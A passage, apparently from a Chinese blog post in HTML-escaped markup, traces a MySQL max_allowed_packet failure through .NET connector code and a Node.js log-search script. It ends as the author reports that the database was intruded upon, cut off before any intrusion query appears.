length;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        buffer[offset] = (&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;)(lenToSend &amp;amp; &lt;span class=&quot;number&quot;&gt;0xff&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        buffer[offset + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] = (&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;)((lenToSend &amp;gt;&amp;gt; &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;) &amp;amp; &lt;span class=&quot;number&quot;&gt;0xff&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        buffer[offset + &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;] = (&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;)((lenToSend &amp;gt;&amp;gt; &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;) &amp;amp; &lt;span class=&quot;number&quot;&gt;0xff&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        buffer[offset + &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;] = sequenceByte++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        outStream.Write(buffer, offset, lenToSend + &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        outStream.Flush();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        length -= lenToSend;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        offset += lenToSend;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;查找maxPacketSize的来源&lt;br&gt;Driver.cs&lt;br&gt;&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Configure&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;MySqlConnection connection&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;bool&lt;/span&gt; firstConfigure = &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// if we have not already configured our server variables&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// then do so now&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (serverProps == &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    firstConfigure = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// if we are in a pool and the user has said it&#39;s ok to cache the&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// properties, then grab it from the pool&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (Pool != &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; Settings.CacheServerProperties)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (Pool.ServerProperties == &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          Pool.ServerProperties = LoadServerProperties(connection);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            serverProps = Pool.ServerProperties;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            serverProps = LoadServerProperties(connection);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        LoadCharacterSets(connection);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;catch&lt;/span&gt; (MySqlException ex)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;// expired password capability&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ex.Number == &lt;span class=&quot;number&quot;&gt;1820&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            IsPasswordExpired = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	.......&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (serverProps.ContainsKey(&lt;span class=&quot;string&quot;&gt;&quot;max_allowed_packet&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	    maxPacketSize = Convert.ToInt64(serverProps[&lt;span class=&quot;string&quot;&gt;&quot;max_allowed_packet&quot;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	.......&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;继续查找LoadServerProperties，仍在Driver.cs中&lt;/p&gt;
&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; Dictionary&amp;lt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;,&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;&amp;gt; LoadServerProperties(MySqlConnection connection)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// load server properties&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Dictionary&amp;lt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;&amp;gt; hash = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Dictionary&amp;lt;&lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    MySqlCommand cmd = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; MySqlCommand(&lt;span class=&quot;string&quot;&gt;&quot;SHOW VARIABLES&quot;&lt;/span&gt;, connection);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;using&lt;/span&gt; (MySqlDataReader reader = cmd.ExecuteReader())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (reader.Read())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; key = reader.GetString(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt; = reader.GetString(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                hash[key] = &lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;// Get time zone offset as numerical value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        timeZoneOffset = GetTimeZoneOffset(connection);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; hash;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;catch&lt;/span&gt; (Exception ex)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        MySqlTrace.LogError(ThreadID, ex.Message);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;客户端的max_allowed_packet也是从服务器获取下来的.&lt;br&gt;所以就没办法解释这个问题，查找mysql错误日志，没有任何错误信息。最后只好把mysql普通日志打开。&lt;br&gt;set global general_log = on&lt;/p&gt;
&lt;p&gt;当天傍晚服务器依就挂掉，整个网站的所有页面无法访问数据库.sql日志100多m，非常不便于查看，用nodejs写了一个查找最长sql语句的方法.&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var fs = require(&amp;apos;fs&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var str = &amp;quot;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;fs.readFile(&amp;apos;mysql.log&amp;apos;, &amp;apos;utf8&amp;apos;, function (err, data) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (err) throw err;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    str = data;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    searchkey = &amp;apos;Query SELECT&amp;apos;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var pos = str.indexOf(searchkey);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var arr=new Array();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    arr[0] = pos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var k = 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var count = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    while (pos !== -1) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        count++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        pos = str.indexOf(searchkey, pos + 1);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        arr[k] = pos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        k++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var max =0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var maxindex = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    for (var i=0;i&amp;lt;arr.length-2;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        var temp = arr[i+1] -arr[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        if (temp&amp;gt;max)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            max = temp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            maxindex =i;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    console.log(max);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var txt = &amp;quot;max:&amp;quot;+max+&amp;quot;\n\r&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    txt= txt + str.substr(arr[maxindex],max)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    fs.writeFile(&amp;apos;result.txt&amp;apos;, txt, function (err) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        if (err) throw err;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        console.log(&amp;apos;It\&amp;apos;s saved!&amp;apos;); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;执行程序查询日志之后发现我们的mysql已被人入侵&lt;br&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span 